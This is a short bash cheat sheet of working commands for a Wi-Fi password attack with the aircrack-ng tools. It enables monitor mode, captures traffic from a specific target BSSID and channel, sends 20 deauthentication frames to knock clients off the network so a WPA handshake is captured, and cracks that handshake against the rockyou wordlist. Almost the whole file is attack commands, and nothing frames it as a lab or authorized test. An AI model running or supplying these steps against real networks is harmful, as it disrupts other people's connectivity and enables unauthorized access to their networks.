```bash
## Making sure monitor mode is ON [first of all checking the interfaces of the network]

iwconfig 					#(this will show the available wifi interfaces)

sudo ifconfig wlan0 down	#(turn my connectivity down for proper monitor mode)		

sudo airmon-ng check kill	#(kill other processes that will interfare with monitor mode)

sudo airmon-ng start wlan0	#(starting monitor mode on wlan0)

iwconfig 					#(confirming monitor mode on wlan0mon)

##dumping network interface for usage
sudo airodump-ng wlan0

#copy the bssid and the channel of target interface
sudo airodump-ng -w hands -c 13 --bssid 7A:3A:6C:F4:9A:33 wlan0   #(w=writefile,c=channel,bssid=mac address)
## Open a new terminal

##deauthenticating the targets network interface (disconnecting it to capture handshake)
sudo aireplay-ng --deauth 20 -a 7A:3A:6C:F4:9A:33 wlan0   #(--deauth=deauthenticate, 							a=force to connect to capture handshake)

# Check the other terminal for "handshake message"

##NOTE
#before deauthenticating the interface you must run step 3 in dumping then open a new terminal for further attack.

##cracking handshakes using aircrack-ng or wireshark
sudo aircrack-ng hands-01.cap -w /usr/share/wordlists/rockyou.txt

```
